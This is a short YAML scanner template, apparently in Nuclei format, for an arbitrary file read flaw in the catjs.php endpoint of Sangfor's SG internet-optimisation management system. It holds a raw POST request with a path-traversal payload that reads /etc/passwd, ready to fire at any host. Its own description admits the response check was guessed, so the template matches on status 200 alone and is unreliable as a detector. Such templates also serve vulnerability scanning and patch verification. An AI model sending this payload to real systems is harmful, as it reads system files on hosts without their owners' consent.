id: poc-9e90b86637ebe7fae8fc
info:
  name: 深信服SG上网优化管理系统catjs存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2025
http:
- raw:
  - 'POST /php/catjs.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)

    Accept: */*

    Connection: Keep-Alive

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 35


    ["../../../../../../../etc/passwd"]'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
